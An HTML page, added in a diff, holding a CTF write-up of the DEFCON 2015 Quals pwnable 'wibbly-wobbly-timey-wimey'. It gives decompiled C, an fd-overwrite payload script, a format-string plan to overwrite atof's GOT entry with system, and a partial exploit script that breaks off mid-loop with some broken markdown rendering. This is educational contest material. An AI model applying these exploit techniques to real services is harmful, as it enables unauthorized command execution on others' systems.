@@ -1,0 +1,944 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey - Hacking Tube 2.0</title>
+<meta name="description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey">
+<meta property="og:url" content="http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/">
+
+
+  <meta property="og:description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2015-05-24T06:40:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey">
+    <meta itemprop="description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">
+    <meta itemprop="datePublished" content="May 24, 2015">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Pwnable
+<strong>Points:</strong> 2</p>
+<blockquote>
+  <p>Wibbly Wobbly Timey Wimey
+Don’t blink!
+wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606</p>
+</blockquote>
+
+<!-- more -->
+
+<p>32 bit ELF, with <strong>Partial RELRO</strong>, <strong>stack canary found</strong>, <strong>NX</strong> &amp; <strong>PIE</strong> enabled.<br />
+First we’ll have to play a game:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You(^V&lt;&gt;) must find your way to the TARDIS(T) by avoiding the angels(A).
+Go through the exits(E) to get to the next room and continue your search.
+But, most importantly, don't blink!
+   012345678901234567890
+00                    E
+01                     
+02  A                  
+03               A     
+04 A                   
+05                     
+06               A     
+07                A    
+08                     
+09        V       A    
+10                  A  
+11                A    
+12              A      
+13                     
+14       A      A      
+15                     
+16                     
+17                     
+18                     
+19                     
+Your move (w,a,s,d,q):
+</code></pre></div></div>
+
+<p>We’ll have to control <code class="highlighter-rouge">V</code> with <strong>wasd</strong>, and the goal is to reach the <code class="highlighter-rouge">E</code> without being touched by those <code class="highlighter-rouge">A</code>s. In the final stage, <code class="highlighter-rouge">E</code> will be changed to <code class="highlighter-rouge">T</code>, and we’ll win the game by reaching <code class="highlighter-rouge">T</code>. After we beat the game, it will ask us to input a <code class="highlighter-rouge">TARDIS KEY</code>. At this moment, teammate <strong>yench</strong> started writing a python script to beat the game, while me and other teammates try to figure out what is the <code class="highlighter-rouge">TARDIS KEY</code>.</p>
+
+<p>We found the following C code:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">sub_EB8</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+16h] [bp-12h]@3
+</span>  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+17h] [bp-11h]@9
+</span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@1
+</span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v4</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// [sp+1Ch] [bp-Ch]@1
+</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"TARDIS KEY: "</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">sub_EB8</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">isalnum</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span> <span class="o">!=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="p">)</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="o">--</span><span class="n">v3</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">do</span>
+    <span class="n">v2</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So it looks like the <code class="highlighter-rouge">TARDIS KEY</code> is a 10-byte-long string, which every character is the machine code in <code class="highlighter-rouge">sub_EB8()</code>, and the machine code should be an <strong>alpha-numeric character</strong> after it does the <code class="highlighter-rouge">&amp; 0x7F</code> operation. After we dump the machine code and wrote a script to extract the correct byte, we got the <code class="highlighter-rouge">TARDIS KEY</code> = <code class="highlighter-rouge">"UeSlhCAGEp"</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARDIS KEY: UeSlhCAGEp
+Welcome to the TARDIS!
+Your options are: 
+1. Turn on the console
+2. Leave the TARDIS
+Selection:
+</code></pre></div></div>
+
+<p>Looks like it only gave us 2 options. But after we reverse the binary, we found that it actually has 3 options.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'3'</span> <span class="p">)</span> <span class="c1">//dword_50B0[0] == our input
+</span> <span class="p">{</span>
+     <span class="k">if</span> <span class="p">(</span> <span class="n">unk_50AC</span> <span class="p">)</span>
+     <span class="p">{</span>
+        <span class="n">choice3</span><span class="p">();</span>
+     <span class="p">}</span>
+     <span class="k">else</span>
+     <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid"</span><span class="p">);</span>
+        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+</code></pre></div></div>
+
+<p>We’ll have to make <code class="highlighter-rouge">unk_50AC</code> = 1. The only way to achieve this is to successfully turn on the TARDIS console:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'1'</span> <span class="p">)</span>
+ <span class="p">{</span>
+     <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_E08</span><span class="p">();</span>
+     <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
+     <span class="p">{</span>
+         <span class="n">printf</span><span class="p">(</span><span class="s">"The TARDIS console is online!"</span><span class="p">);</span>
+         <span class="n">unk_50AC</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+         <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+     <span class="p">}</span>
+     <span class="k">else</span>
+     <span class="p">{</span>
+         <span class="n">printf</span><span class="p">(</span><span class="s">"Access denied except between %s and %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
+         <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+</code></pre></div></div>
+
+<p>The line <code class="highlighter-rouge">LOBYTE(v4) = sub_E08();</code> will do the following checking:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">sub_E08</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="n">dword_50A4</span> <span class="o">&gt;</span> <span class="mi">1431907180</span> <span class="o">&amp;&amp;</span> <span class="n">dword_50A4</span> <span class="o">&lt;=</span> <span class="mi">1431907199</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>and we can only write <code class="highlighter-rouge">dword_50A4</code> in function <code class="highlighter-rouge">sub_BCB()</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="nf">sub_BCB</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax@1
+</span>  <span class="kt">size_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@7
+</span>  <span class="kt">int</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@5
+</span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-Ch]@5
+</span>
+  <span class="n">v0</span> <span class="o">=</span> <span class="n">unk_50A8</span><span class="o">++</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&gt;</span> <span class="mh">0xFFFFFFFF</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Unauthorized occupant detected...goodbye"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">fwrite</span><span class="p">(</span><span class="s">"Time vortex not responding</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mh">0x1Bu</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">unk_2F4A</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span> <span class="c1">// here
+</span>    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+      <span class="n">dword_50A4</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">//here
+</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">alarm</span><span class="p">(</span><span class="mi">2u</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Notice that <code class="highlighter-rouge">dword_50B0[2]</code> is the <strong>fd</strong>, and <code class="highlighter-rouge">dword_50B0[0]</code> is our <strong>input buffer</strong>(where the program store our <strong>options</strong>). By overflowing <code class="highlighter-rouge">dword_50B0[0]</code>, we can overwrite the value stored in <code class="highlighter-rouge">dword_50B0[2]</code> (the initial value is <strong>3</strong>, we’ll have to overwrite it to <strong>0</strong>(<code class="highlighter-rouge">stdin</code>) so we can write our input into <code class="highlighter-rouge">dword_50A4</code>).</p>
+
+<p>To sum up, here are the steps for enabling the option 3:</p>
+<ol>
+  <li>Overwrite the <strong>fd</strong> (<code class="highlighter-rouge">dword_50B0[2]</code>) into <strong>0</strong> by overflowing <code class="highlighter-rouge">dword_50B0[0]</code></li>
+  <li>Write the value into <code class="highlighter-rouge">dword_50A4</code> so it can pass the checking function <code class="highlighter-rouge">sub_E08()</code>. Notice that <code class="highlighter-rouge">sub_BCB()</code> is called by sending the <code class="highlighter-rouge">SIGALARM</code> signal, so be aware of the timing.</li>
+  <li>Select option <strong>1</strong>, for turning on the TARDIS console.</li>
+  <li>Option 3 will be enabled successfully after we turn on a TARDIS console.</li>
+</ol>
+
+<p>Here’s the payload:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># overwrite fd into stdin</span>
+<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c"># wait for 2 second (until the service call sub_BCB())</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># m+YU = 1431907181</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>    <span class="c"># turn on the TARDIS console</span>
+<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># write the fd back</span>
+<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After we successfully enable option 3, let’s see what does it do:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">choice3</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">double</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST28_8@6
+</span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@9
+</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">nptr</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-424h]@4
+</span>  <span class="kt">double</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-418h]@6
+</span>  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+3Ch] [bp-40Ch]@2
+</span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+43Ch] [bp-Ch]@1
+</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">);</span>
+      <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">sub_F7E</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">1023</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="c1">// input coordinates
+</span>        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="n">nptr</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="sc">','</span><span class="p">);</span> <span class="c1">// split with ','
+</span>      <span class="k">if</span> <span class="p">(</span> <span class="n">nptr</span> <span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid coordinates"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">v0</span> <span class="o">=</span> <span class="n">atof</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">atof</span><span class="p">(</span><span class="n">nptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%f, %f</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="mi">51</span><span class="p">.</span><span class="mi">492137</span> <span class="o">!=</span> <span class="n">v0</span> <span class="o">||</span> <span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="mi">192878</span> <span class="o">!=</span> <span class="n">v3</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Coordinate "</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span> <span class="c1">// format string vulnerability
+</span>    <span class="n">printf</span><span class="p">(</span><span class="s">" is occupied by another TARDIS.  Materializing there "</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"would rip a hole in time and space. Choose again."</span><span class="p">);</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"You safely travel to coordinates %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">)</span>
+    <span class="n">terminate_proc</span><span class="p">();</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So it will let us input our coordinates, and check the coordinates’ value. If the coordinates are <strong>(51.492137, -0.192878)</strong>, it will trigger the <strong>format string vulnerability</strong>. After leaking some messages, we found that we’re able to leak the <strong>stack address</strong>. This is very important, since the binary has the <strong>PIE</strong> &amp; <strong>Partial RELRO</strong> protection, we don’t know where the text’s base address is, neither functions’ GOT address. But if we can leak the stack address, we can calculate the location that stored the return address, <strong>and leak the return address to calculate the text’s base address.</strong> After we have the text’s base address, we can <strong>calculate the functions’ GOT address, and leak the function pointer.</strong> After we got all the memory address, we can use the format string vulnerability to overwrite <code class="highlighter-rouge">atof</code>’s GOT entry into <code class="highlighter-rouge">system</code>’s address, and execute our command by entering our commands as the coordinates.</p>
+
+<p>So to sum up:</p>
+<ol>
+  <li>Leak the stack address and calculate the return address’ location</li>
+  <li>Leak the return address and calculate the text’s base address</li>
+  <li>Calculate <code class="highlighter-rouge">atof</code>’s GOT and leak the function pointer</li>
+  <li>Calculate <code class="highlighter-rouge">system</code>’s address and overwrite <code class="highlighter-rouge">atof</code>’s GOT entry</li>
+  <li>Input coordinates <strong>“[command], [garbage]”</strong> to execute our commands</li>
+</ol>
+
+<p>Here’s the exploit. The part that beating the game was done by <strong>yench</strong>, while the rest was done by me.</p>
+
+<p>```python wwtw_exp.py
+from pwn import *
+import struct
+import time
+import binascii
+import hashlib
+import time
+import string</p>
+
+<p>ip = “wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me”
+port = 2606</p>
+
+<p>def getMap(s):
+	MAP=s
+	MAP=MAP[:len(MAP)-24]
+	print MAP
+	MAP=MAP[len(MAP)-479:]
+	sql=MAP.split(‘\n’)
+	i=0
+	res = [[] for x in range(20)] 
+	for l in sql:
+		l = l[3:]
+		res[i]=l
+		i+=1 
+	return res</p>
+
+<p>def getChar(c,MAP):
+	x=0
+	y=0
+	for i in MAP:
+		for j in i:
+			for a in c:
+				if j == a:
+					return (y,x)
+			y+=1
+		x+=1
+		y=0
+	return (-1,-1)</p>
+
+<p>t = remote(ip, port)</p>
+
+<h1 id="start-playing-the-game">start playing the game</h1>
+<p>for test in range(1000):
+	s = t.readuntil(“: “)
+	if “KEY” in s:
+		print s
+		break
+	MAP = getMap(s)
+	GOAL=(-1,-1)
+	ME=(-1,-1)
+	GOAL=getChar([‘E’,’T’],MAP)
+	print GOAL
+	ME=getChar([’&lt;’,’&gt;’,’V’,’^’],MAP)
+	print ME</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drct = []
+if( ME[0] - GOAL[0] &gt; 0 ):
+	if( ME[0] &gt; 0 and MAP[ME[1]][ME[0]-1] !='A'):
+		drct+='a'
+elif( ME[0] - GOAL[0] &lt; 0 ):
+	if( ME[0] &lt; 19 and MAP[ME[1]][ME[0]+1] !='A'):
+		drct+='d'
+if( ME[1] - GOAL[1] &gt; 0 ):
+	if( ME[1] &gt; 0 and MAP[ME[1]-1][ME[0]] !='A'):
+		drct+='w'
+elif( ME[1] - GOAL[1] &lt; 0 ):
+	if( ME[1] &lt; 19 and MAP[ME[1]+1][ME[0]] !='A'):
+		drct+='s'
+if drct == [] :
+	if ME[0] == GOAL[0] :
+		if ME[0] &gt; 0 :
+			drct+='a'
+		else:
+			drct+='d'
+	elif ME[1] == GOAL[1] :
+		if ME[1] &gt; 0 :
+			drct+='w'
+		else:
+			drct+='s'
+		
+print drct
